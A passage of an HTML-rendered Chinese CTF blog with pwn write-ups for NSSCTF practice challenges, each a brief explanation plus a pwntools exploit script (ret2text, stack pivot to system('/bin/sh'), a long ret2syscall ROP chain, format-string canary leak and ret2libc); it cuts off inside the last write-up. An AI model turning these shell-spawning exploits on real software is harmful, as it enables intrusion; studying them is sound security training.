class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node5.anna.nssctf.cn&#x27;,28003)</span><br><span class=\"line\">payload=b&#x27;a&#x27;*0x108+p64(0x0400591)+p64(0x400726)</span><br><span class=\"line\">p.sendlineafter(&#x27;name?&#x27;,payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"ciscn-2019东南pwn2\"><a class=\"anchor\" href=\"#ciscn-2019东南pwn2\">#</a> [CISCN 2019 东南] PWN2</h5>\n<p>这个题很不错适合新手吃 32 位的栈偏移</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class=\"line\">leave_ret=0x080485FD  </span><br><span class=\"line\">offset=0xffffcd58-0xffffcd20</span><br><span class=\"line\">io=process(&#x27;./pwn&#x27;)</span><br><span class=\"line\">io=remote(&#x27;node5.anna.nssctf.cn&#x27;,28203)</span><br><span class=\"line\">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class=\"line\"># 第一次溢出1字节覆盖\\x00，泄露ebp</span><br><span class=\"line\">io.sendafter(b&#x27;name?\\n&#x27;,b&#x27;a&#x27;*(0x28-1)+b&#x27;b&#x27;)</span><br><span class=\"line\">io.recvuntil(b&#x27;aaab&#x27;)</span><br><span class=\"line\">leak_ebp=u32(io.recvuntil(b&#x27;\\xff&#x27;))</span><br><span class=\"line\">success(hex(leak_ebp)) </span><br><span class=\"line\">target_addr=leak_ebp-offset-0x4 # -0x4是因为第二次leave;ret的时候，pop esp会导致+0x4</span><br><span class=\"line\"> # 第二次溢出，rop写在s中，栈迁移到s，调用system，参数为自己写在栈上的/bin/sh，参数偏移计算可</span><br><span class=\"line\">payload=p32(elf.plt[&#x27;system&#x27;])+p32(elf.sym[&#x27;_start&#x27;])+p32(leak_ebp-offset+0xc)+b&#x27;/bin/sh\\x00&#x27;</span><br><span class=\"line\">payload=payload.ljust(0x28,b&#x27;a&#x27;)+p32(target_addr)+p32(leave_ret)</span><br><span class=\"line\">io.send(payload)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"ciscn-2023-初赛烧烤摊儿\"><a class=\"anchor\" href=\"#ciscn-2023-初赛烧烤摊儿\">#</a> [CISCN 2023 初赛] 烧烤摊儿</h5>\n<p>这是一个 64 位的 ret2syscall 注意 execve 调用位 64 是 59，或者可以直接使用 ropgadget 的 ropchain 来直接生成 payload 首先审计源码利用负数达到金额然后在利用改名里面的溢出达到 shell，注意这个是静态</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">from struct import pack</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">io=remote(&#x27;node4.anna.nssctf.cn&#x27;,28947)</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level=&#x27;debug&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">io.sendline(str(1))</span><br><span class=\"line\"></span><br><span class=\"line\">io.sendline(str(1))</span><br><span class=\"line\"></span><br><span class=\"line\">io.sendline(str(-10000))</span><br><span class=\"line\"></span><br><span class=\"line\">io.sendline(str(4))</span><br><span class=\"line\"></span><br><span class=\"line\">io.sendline(str(5))</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">p = b&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x000000000040a67e) # pop rsi ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x00000000004e60e0) # @ .data</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000458827) # pop rax ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += b&#x27;/bin//sh&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x000000000045af95) # mov qword ptr [rsi], rax ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x000000000040a67e) # pop rsi ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x00000000004e60e8) # @ .data + 8</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000447339) # xor rax, rax ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x000000000045af95) # mov qword ptr [rsi], rax ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x000000000040264f) # pop rdi ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x00000000004e60e0) # @ .data</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x000000000040a67e) # pop rsi ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x00000000004e60e8) # @ .data + 8</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x00000000004a404b) # pop rdx ; pop rbx ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x00000000004e60e8) # @ .data + 8</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x4141414141414141) # padding</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000447339) # xor rax, rax ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000402404) # syscall</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">payload=b&#x27;a&#x27;*(0x20+0x8)+p</span><br><span class=\"line\"></span><br><span class=\"line\">io.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"sdctf-2022horoscope\"><a class=\"anchor\" href=\"#sdctf-2022horoscope\">#</a> [SDCTF 2022]Horoscope</h5>\n<blockquote>\n<p>利用这个 atoi 去是 a1 等于 1 这个 s 的话是需要使用 0x38 才能溢出，那么的话利用使一个 b'a'*0x38 等于 b'1'+b'a'*0x38 因为 atoi 只会转换数字为整数，所以我们可以利用这个点去得到让这个程序完整运行，然后就是一个简单的 ret2text 了</p>\n</blockquote>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context.log_level=&#x27;debug&#x27;</span><br><span class=\"line\">#p=remote(&#x27;node4.anna.nssctf.cn&#x27;,28120)</span><br><span class=\"line\">p=process(&#x27;./horoscope&#x27;)</span><br><span class=\"line\">elf=ELF(&#x27;horoscope&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">#payload=b&#x27;1&#x27;+b&#x27;a&#x27;*(0x30+0x7)+p64(elf.sym[&#x27;debug&#x27;])+p64(elf.sym[&#x27;test&#x27;])</span><br><span class=\"line\">payload=b&#x27;1&#x27;+b&#x27;a&#x27;*(0x37)+p64(0x40095F)</span><br><span class=\"line\">p.sendlineafter(b&#x27;pe&#x27;,payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"bjdctf-2020babyrop2\"><a class=\"anchor\" href=\"#bjdctf-2020babyrop2\">#</a> [BJDCTF 2020]babyrop2</h5>\n<blockquote>\n<p>这个题讲究的是 ret2libc 注意字符串溢出为 7 即可按照 ret2libc 打就行</p>\n</blockquote>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level=&#x27;debug&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">from LibcSearcher import *</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">p=remote(&#x27;node4.anna.nssctf.cn&#x27;,28241)</span><br><span class=\"line\"></span><br><span class=\"line\">#p=process(&#x27;./pwn&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">elf=ELF(&#x27;pwn&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">p.sendlineafter(&#x27;u!\\n&#x27;,&#x27;%7$p&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(&#x27;0x&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">a=int(p.recv(16),16)</span><br><span class=\"line\"></span><br><span class=\"line\">log.info(hex(a))</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">puts_plt=elf.plt[&#x27;puts&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\">puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\">pop_rdi=0x400993</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">main=elf.sym[&#x27;main&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">vuln=elf.sym[&#x27;vuln&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\">ret=0x4005f9</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">payload=b&#x27;a&#x27;*(0x20-0x8)+p64(a)+p64(0)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(vuln)</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">p.sendlineafter(&#x27;ory!\\n&#x27;,payload)</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">base_addr=u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))</span><br><span class=\"line\"></span><br><span class=\"line\">log.info(hex(base_addr))</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">puts=LibcSearcher(&#x27;puts&#x27;,base_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">libc_base=base_addr-puts.dump(&#x27;puts&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">system=libc_base+puts.dump(&#x27;system&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">bin_sh=libc_base+puts.dump(&#x27;str_bin_sh&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">payload=b&#x27;a&#x27;*(0x20-0x8)+p64(a)+p64(0)+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(system)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(&#x27;ory!\\n&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"bjdctf-2020ydsneedgirlfriend\"><a class=\"anchor\" href=\"#bjdctf-2020ydsneedgirlfriend\">#</a> [BJDCTF 2020]YDSneedGirlfriend</h5>\n<blockquote>\n<p>这个题又是一个堆的题要好好的利用 uaf 去得到 shell<br />\n 首先我们看到这个题目是有一个 free 来释放内存但是并没有给指针清零导致再次分配时在被占用，并且 show 函数可以来调用指针指到的函数将被调用</p>\n</blockquote>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span 